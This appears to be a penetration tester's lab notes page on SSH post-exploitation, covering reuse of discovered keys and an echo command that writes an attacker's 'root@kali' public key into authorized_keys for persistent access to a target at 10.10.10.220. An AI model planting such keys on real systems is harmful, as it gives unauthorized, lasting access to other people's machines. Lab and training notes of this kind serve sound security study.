
# Table of Contents

1. See general SSH [[2. Enumeration/TCP/22. SSH/1. Guide|Guide]] 
2. If you find a weak public key, see [[RSA Decrypt]]
# Access to a Key

If you find an SSH key, attempt to use that key to login to the related user and all possible users.
# Key Write Access

#securing-root 

Make new keys if you have root write access

1. Create new ssh keys using ssh-keygen on your machine
2. Copy the public key from `id_rsa.pub` and create a new file `authorized_keys` in `/root/.ssh/`
3. Get a SSH connection on your machine: `ssh -i id_rsa root@10.10.10.220`


```
$ cd /home/user
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGEUzu7cGthWtPNXM5/rAvPBywgyh68AEpSyUBXm24kByXu+GhEmvAiVlkAhasBgTjiCbpup3dmzz54ADlo4T2jUWoVVEDOw82eKQ6EoqpYnHGVmpDmJ1n7+eCvb3ut0bl5VOnTkhYSWS8G9V6V+E/VmDun63HoHCHzvtBlbN/ZmhRKxdwNFSYN/NswU8MFK+MVXxa/FJUxrOJVAnefXQdfDBxIt4j/qqMr68u9lQfqOX5shmS0M55lFNAY2mR6INBQtT6AnAWremPCHdUHxU3eSvzUcItaamecSPTfDgMQDQkxXrrsKQLkJeCKZ/1EwDBXIF3RGCeNGq0hCYHSF8d root@kali" > .ssh/authorized_keys$
```

# Running Internally

It is possible to SSH internally if there is SSH running already on the victim, `ps aux` to privilege escalation